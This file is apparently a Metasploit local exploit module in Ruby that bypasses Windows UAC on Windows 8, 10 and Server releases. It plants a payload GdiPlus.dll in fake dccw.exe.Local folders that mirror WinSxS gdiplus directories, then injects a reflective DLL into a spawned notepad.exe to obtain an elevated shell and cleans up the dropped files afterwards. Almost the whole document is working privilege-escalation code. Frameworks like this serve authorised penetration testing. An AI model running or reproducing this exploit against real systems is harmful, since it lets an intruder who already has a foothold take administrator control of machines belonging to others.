##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Exploit::FileDropper
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::ReflectiveDLLInjection
  include Post::Windows::Runas

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS',
      'Description'   => %q{
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off by abusing the way "WinSxS" works in Windows
        systems. This module uses the Reflective DLL Injection technique to drop
        only the DLL payload binary instead of three seperate binaries in the
        standard technique. However, it requires the correct architecture to be
        selected, (use x64 for SYSWOW64 systems also).
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Ernesto Fernandez "L3cr0f" <ernesto.fernpro[at]gmail.com>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [
          'URL', 'https://github.com/L3cr0f/DccwBypassUAC'
        ]
      ],
      'DisclosureDate'=> 'Apr 06 2017'
    ))

  end

  def exploit
    # Validate that we can actually do things before we bother
    # doing any more work
    validate_environment!
    check_permissions!

    # Get all required environment variables in one shot instead. This
    # is a better approach because we don't constantly make calls through
    # the session to get the variables.
    env_vars = get_envs('TEMP', 'WINDIR')

    # Get UAC level so as to verify if the module will be successful
    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Failure::NotVulnerable,
                  "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good('UAC is set to Default')
        print_good('BypassUAC can bypass this setting, continuing...')
      when UAC_NO_PROMPT
        print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
        shell_execute_exe
        return
    end

    dll_path = bypass_dll_path
    payload_filepath = "#{env_vars['TEMP']}\\dccw.exe.Local"

    # Establish the folder pattern so as to get those folders that match it
    sysarch = sysinfo['Architecture']
    if sysarch == ARCH_X86
      targetedDirectories = "C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*"
    else
      targetedDirectories = "C:\\Windows\\WinSxS\\amd64_microsoft.windows.gdiplus_*"
    end

    directoryNames = get_directories(payload_filepath, targetedDirectories)
    create_directories(payload_filepath, directoryNames)
    upload_payload_dll(payload_filepath, directoryNames)

    pid = spawn_inject_proc(env_vars['WINDIR'])

    file_paths = get_file_paths(env_vars['WINDIR'], payload_filepath)
    run_injection(pid, dll_path, file_paths)
  end

  def bypass_dll_path
    # path to the bypassuac binary
    path = ::File.join(Msf::Config.data_directory, 'post')

    sysarch = sysinfo['Architecture']
    if sysarch == ARCH_X86
      if (target_arch.first =~ /64/i) || (payload_instance.arch.first =~ /64/i)
        fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')
      else
        ::File.join(path, "bypassuac-x86.dll")
      end
    else
      unless (target_arch.first =~ /64/i) && (payload_instance.arch.first =~ /64/i)
        fail_with(Failure::BadConfig, 'x86 Target Selected for x64 System')
      else
        ::File.join(path, "bypassuac-x64.dll")
      end
    end
  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end

  def run_injection(pid, dll_path, file_paths)
    vprint_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
    begin
      path_struct = create_struct(file_paths)

      vprint_status("Opening process #{pid}")
      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
      exploit_mem, offset = inject_dll_into_process(host_process, dll_path)

      vprint_status("Injecting struct into #{pid}")
      struct_addr = host_process.memory.allocate(path_struct.length)
      host_process.memory.write(struct_addr, path_struct)

      vprint_status('Executing payload')
      thread = host_process.thread.create(exploit_mem + offset, struct_addr)
      print_good("Successfully injected payload in to process: #{pid}")
      client.railgun.kernel32.WaitForSingleObject(thread.handle, 14000)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to Inject Payload to #{pid}!")
      vprint_error(e.to_s)
    end
  end

  # Create a process in the native architecture
  def spawn_inject_proc(win_dir)
    print_status('Spawning process with Windows Publisher Certificate, to inject into...')
    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      cmd = "#{win_dir}\\sysnative\\notepad.exe"
    else
      cmd = "#{win_dir}\\System32\\notepad.exe"
    end
    pid = cmd_exec_get_pid(cmd)

    unless pid
      fail_with(Failure::Unknown, 'Spawning Process failed...')
    end

    pid
  end

  # Upload only one DLL, the rest will be copied into the specific folders
  def upload_payload_dll(payload_filepath, directoryNames)
    dllPath = "#{directoryNames[0]}\\GdiPlus.dll"
    payload = generate_payload_dccw_gdiplus_dll({:dll_exitprocess => true})
    print_status('Uploading the Payload DLL to the filesystem...')
    begin
      vprint_status("Payload DLL #{payload.length} bytes long being uploaded..")
      write_file(dllPath, payload)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Error uploading file #{directoryNames[0]}: #{e.class} #{e}")
    end

    if directoryNames.size > 1
      copy_payload_dll(directoryNames, dllPath)
    end
  end

  def copy_payload_dll(directoryNames, dllPath)
    for i in 1 .. directoryNames.size - 1
      if client.railgun.kernel32.CopyFileA(dllPath, "#{directoryNames[i]}\\GdiPlus.dll", false)['return'] == false
        print_error("Error! Cannot copy the payload to all the necessary folders! Continuing just in case it works...")
      end
    end
  end

  def validate_environment!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?

    winver = sysinfo['OS']

    case winver
    when /Windows (8|2008|2012|10)/
      print_good("#{winver} may be vulnerable.")
    else
      fail_with(Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status('UAC is Enabled, checking level...')
    else
      unless is_in_admin_group?
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end
  end

  # Creating the necessary directories to perform the DLL hijacking
  # Since we don't know which path "dccw.exe" will choose, we create
  # all the directories that match with the initial pattern
  def create_directories(payload_filepath, directoryNames)
    env_vars = get_envs('TEMP')

    print_status("Creating temporary folders...")
    if client.railgun.kernel32.CreateDirectoryA(payload_filepath, nil)['return'] == 0
      fail_with(Failure::Unknown, "Cannot create the directory \"#{env_vars['TEMP']}dccw.exe.Local\"")
    end

    for i in 0 .. directoryNames.size - 1
      if client.railgun.kernel32.CreateDirectoryA(directoryNames[i], nil)['return'] == 0
        fail_with(Failure::Unknown, "Cannot create the directory \"#{env_vars['TEMP']}dccw.exe.Local\\#{directoryNames[i]}\"")
      end
    end
  end

  # Get all the directories that match with the initial pattern
  def get_directories(payload_filepath, targetedDirectories)
    directoryNames = []
    findFileDataSize = 592
    maxPath = client.railgun.const("MAX_PATH")
    fileNamePadding = 44

    hFile = client.railgun.kernel32.FindFirstFileA(targetedDirectories, findFileDataSize)
    if hFile['return'] == client.railgun.const("INVALID_HANDLE_VALUE")
      fail_with(Failure::Unknown, "Cannot get the targeted directories!")
    end
    findFileData = hFile['lpFindFileData']

    begin
      fileAttributes = findFileData[0, 4].unpack('V').first
      andOperation = fileAttributes & client.railgun.const("FILE_ATTRIBUTE_DIRECTORY")
      if andOperation
        path = "#{payload_filepath}\\#{normalize_path(findFileData[fileNamePadding, fileNamePadding + maxPath])}"
        directoryNames.push(path)
    end

    findNextFile = client.railgun.kernel32.FindNextFileA(hFile['return'], findFileDataSize)
    findFileData = findNextFile['lpFindFileData']
    end while findNextFile['return'] != false

    if findNextFile['GetLastError'] != client.railgun.const("ERROR_NO_MORE_FILES")
      fail_with(Failure::Unknown, "Cannot get the targeted directories!")
    end

    directoryNames
  end

  #Removes the remainder part composed of 'A' of the path
  def normalize_path(path)
    counter = 0
    while path[counter] != 'A' and path[counter + 1] != 'A' and path[counter + 2] != 'A' do
    counter = counter + 1
    end

    path[0, counter + 1]
  end

  def get_file_paths(win_path, payload_filepath)
    paths = {}
    paths[:szElevDll] = 'dccw.exe.Local'
    paths[:szElevDir] = "#{win_path}\\System32"
    paths[:szElevDirSysWow64] = "#{win_path}\\sysnative"
    paths[:szElevExeFull] = "#{paths[:szElevDir]}\\dccw.exe"
    paths[:szElevDllFull] = "#{paths[:szElevDir]}\\#{paths[:szElevDll]}"
    paths[:szTempDllPath] = payload_filepath

    paths
  end

  # Creates the paths struct which contains all the required paths
  # the dll needs to copy/execute etc.
  def create_struct(paths)

    # write each path to the structure in the order they
    # are defined in the bypass uac binary.
    struct = ''
    struct << fill_struct_path(paths[:szElevDir])
    struct << fill_struct_path(paths[:szElevDirSysWow64])
    struct << fill_struct_path(paths[:szElevDll])
    struct << fill_struct_path(paths[:szElevDllFull])
    struct << fill_struct_path(paths[:szElevExeFull])
    struct << fill_struct_path(paths[:szTempDllPath])

    struct
  end

  def fill_struct_path(path)
    path = Rex::Text.to_unicode(path)
    path + "\x00" * (520 - path.length)
  end

  def on_new_session(session)
    if session.type == 'meterpreter'
      session.core.use('stdapi') unless session.ext.aliases.include?('stdapi')
    end
    remove_dropped_elements(session)
  end

  # Remove all the created and dropped files and folders
  def remove_dropped_elements(session)
    droppedElements = []
    successfullyRemoved = true

    env_vars = get_envs('TEMP', 'WINDIR')
    payload_filepath = "#{env_vars['TEMP']}\\dccw.exe.Local"

    sysarch = sysinfo['Architecture']
    if sysarch == ARCH_X86
      targetedDirectories = "C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*"
    else
      targetedDirectories = "C:\\Windows\\WinSxS\\amd64_microsoft.windows.gdiplus_*"
    end

    directoryNames = get_directories(payload_filepath, targetedDirectories)
    file_paths = get_file_paths(env_vars['WINDIR'], payload_filepath)

    # Remove "GdiPlus.dll" from "C:\%TEMP%\dccw.exe.Local\*_microsoft.windows.gdiplus_*\"
    # and "C:\Windows\System32\dccw.exe.Local\*_microsoft.windows.gdiplus_*\"
    for i in 0 .. directoryNames.size - 1
      directoryName = directoryNames[i].split("\\").last

      droppedElements.push("#{directoryNames[i]}\\GdiPlus.dll")
      session.fs.file.rm("#{directoryNames[i]}\\GdiPlus.dll") rescue nil
      droppedElements.push("#{file_paths[:szElevDllFull]}\\#{directoryName}\\GdiPlus.dll")
      session.fs.file.rm("#{file_paths[:szElevDllFull]}\\#{directoryName}\\GdiPlus.dll") rescue nil
    end

    # Remove folders from "C:\%TEMP%\dccw.exe.Local\" and "C:\Windows\System32\dccw.exe.Local\"
    for i in 0 .. directoryNames.size - 1
      directoryName = directoryNames[i].split("\\").last

      droppedElements.push(directoryNames[i])
      session.fs.dir.rmdir(directoryNames[i]) rescue nil
      droppedElements.push("#{file_paths[:szElevDllFull]}\\#{directoryName}")
      session.fs.dir.rmdir("#{file_paths[:szElevDllFull]}\\#{directoryName}") rescue nil
    end

    # Remove "C:\Windows\System32\dccw.exe.Local" folder
    droppedElements.push(file_paths[:szTempDllPath])
    session.fs.dir.rmdir(file_paths[:szTempDllPath]) rescue nil
    droppedElements.push(file_paths[:szElevDllFull])
    session.fs.dir.rmdir(file_paths[:szElevDllFull]) rescue nil

    # Check if have been successfully removed
    for i in 0 .. droppedElements.size - 1
      stat = session.fs.file.stat(droppedElements[i]) rescue nil
      if stat
        print_error("Unable to delete #{droppedElements[i]}!")
        successfullyRemoved = false
      end
    end

    if successfullyRemoved
      print_good("All the dropped elements have been successfully removed")
    else
      print_warning("Could not delete some dropped elements! They will require manual cleanup on the target")
    end
  end

end